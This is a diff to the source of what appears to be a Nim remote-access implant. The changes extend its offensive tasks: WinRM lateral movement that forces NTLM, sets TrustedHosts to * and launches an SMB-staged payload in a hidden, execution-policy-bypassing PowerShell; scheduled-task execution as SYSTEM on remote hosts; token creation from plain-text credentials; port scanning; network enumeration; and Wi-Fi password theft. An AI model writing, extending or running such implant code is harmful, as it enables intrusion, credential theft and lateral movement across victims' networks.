@@ -704,7 +704,7 @@ when defined(windows):
       Sleep(DWORD(3000))
       out2.add(runShell("schtasks /Delete /S " & host & " /TN " & tn & " /F 2>&1") & "\n")
       if user != "": discard runShell("net use \\\\" & host & "\\IPC$ /delete 2>&1")
-      return out2
+      return "[+] atexec → " & host & "\n    task: " & tn & "\n    cmd: " & cmd & "\n    runas: SYSTEM\n" & out2
     elif meth == "runas":
       let tn = "endgame_ru"
       let ru = if user.startsWith(".\\") or user.startsWith("./"): user[2..^1] else: user
@@ -787,12 +787,20 @@ when defined(windows):
       let remotePath = smbStage(host, exeName, user, pass, payData)
       if remotePath == "": return "winrm: SMB staging failed"
       var psCmd: string
+      # Force NTLM: resolve hostname to IPv4 (skip IPv6 with AddressFamily -ne 23),
+      # set TrustedHosts=*, and pass -Authentication NTLM to bypass Kerberos/Negotiate.
+      # 0x8009030d (SEC_E_NO_CREDENTIALS) occurs when Negotiate tries Kerberos for a
+      # local account on a domain-joined machine — NTLM auth resolves this.
+      let addTrust = "Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force -EA SilentlyContinue;" &
+                     "try{$ip=([System.Net.Dns]::GetHostAddresses('" & host & "')|" &
+                     "Where-Object{$_.AddressFamily -ne 23}|Select-Object -First 1).IPAddressToString}" &
+                     "catch{$ip='" & host & "'};"
       if user != "" and pass != "":
-        psCmd = "$c=New-Object PSCredential('" & user & "',(ConvertTo-SecureString '" & pass &
-                "' -AsPlainText -Force));Invoke-Command -ComputerName '" & host &
-                "' -Credential $c -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
+        psCmd = addTrust & "$c=New-Object PSCredential('" & user & "',(ConvertTo-SecureString '" & pass &
+                "' -AsPlainText -Force));Invoke-Command -ComputerName $ip -Authentication NTLM" &
+                " -Credential $c -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
       else:
-        psCmd = "Invoke-Command -ComputerName '" & host & "' -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
+        psCmd = addTrust & "Invoke-Command -ComputerName $ip -Authentication NTLM -ScriptBlock {Start-Process '" & remotePath & "' -WindowStyle Hidden}"
       let shellCmd = "powershell -NoP -W Hidden -Exec Bypass -C \"" & psCmd.replace("\"", "\\\"") & "\""
       let out2 = runShell(shellCmd)
       return "[+] winrm → " & host & "\n    path: " & remotePath & "\n" & out2.strip()
@@ -1202,6 +1210,9 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       entriesArr.add(%*{"name": "/", "is_dir": true, "size": 0, "mod": ""})
       t.sendResult(id, $(%*{"cwd": "", "path": "", "drives": true, "entries": entriesArr}), "")
 
+  of "NETSTAT":
+    t.sendResult(id, runShell("netstat -ano 2>&1"), "")
+
   of "NET_SHARES":
     when defined(windows):
       let host    = args.strip(chars = {'\\', '/'})
@@ -1308,10 +1319,21 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "TOKEN_MAKE":
     when defined(windows):
       try:
-        let j = parseJson(args)
-        let user   = j{"user"}.getStr()
-        let domain = j{"domain"}.getStr(".")
-        let pass   = j{"pass"}.getStr()
+        var user = ""; var domain = "."; var pass = ""
+        if args.startsWith("{"):
+          let j = parseJson(args)
+          user   = j{"user"}.getStr()
+          domain = j{"domain"}.getStr(".")
+          pass   = j{"pass"}.getStr()
+        else:
+          # "domain\user pass" or "user pass"
+          let sp = args.find(' ')
+          if sp < 0: t.sendResult(id, "", "TOKEN_MAKE requires user+pass"); return
+          let domuser = args[0..<sp]
+          pass = args[sp+1..^1]
+          let bs = domuser.find('\\')
+          if bs >= 0: domain = domuser[0..<bs]; user = domuser[bs+1..^1]
+          else: user = domuser
         if user == "" or pass == "": t.sendResult(id, "", "TOKEN_MAKE requires user+pass"); return
         t.sendResult(id, doTokenMake(user, domain, pass), "")
       except: t.sendResult(id, "", "token_make: " & getCurrentExceptionMsg())
@@ -1378,10 +1400,20 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
 
   of "PORT_SCAN":
     try:
-      let j = parseJson(args)
-      let host    = j{"host"}.getStr("127.0.0.1")
-      let ports   = j{"ports"}.getStr("80,443,445,3389,22,21,8080,8443")
-      let timeout = j{"timeout"}.getInt(500)
+      var host = "127.0.0.1"
+      var ports = "80,443,445,3389,22,21,8080,8443"
+      var timeout = 500
+      if args.startsWith("{"):
+        let j = parseJson(args)
+        host    = j{"host"}.getStr("127.0.0.1")
+        ports   = j{"ports"}.getStr(ports)
+        timeout = j{"timeout"}.getInt(500)
+      else:
+        let parts = args.splitWhitespace()
+        if parts.len >= 1: host = parts[0]
+        if parts.len >= 2: ports = parts[1]
+        if parts.len >= 3:
+          try: timeout = parseInt(parts[2]) except: discard
       t.sendResult(id, doPortScan(host, ports, timeout), "")
     except: t.sendResult(id, "", "port_scan: " & getCurrentExceptionMsg())
 
@@ -1538,7 +1570,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else:
       t.sendResult(id, "", "CLIP_GET: not supported on Linux")
 
-  of "CRED_WIFI":
+  of "WIFI_CREDS", "CRED_WIFI":
     when defined(windows):
       let profilesOut = runShell("netsh wlan show profiles 2>&1")
       var combined = ""
@@ -1817,7 +1849,8 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
               t.sendResult(id, "", "LATERAL: payload download failed"); return
             if cmd == "":
               let tmpPath = getEnv("TEMP", getTempDir()) & "\\" & payloadName
-              writeFile(tmpPath, cast[string](payData))
+              try: writeFile(tmpPath, cast[string](payData))
+              except: discard  # methods that use payData bytes don't need local file
               cmd = tmpPath
         if host == "": t.sendResult(id, "", "LATERAL requires host"); return
         if cmd == "" and payData.len == 0:
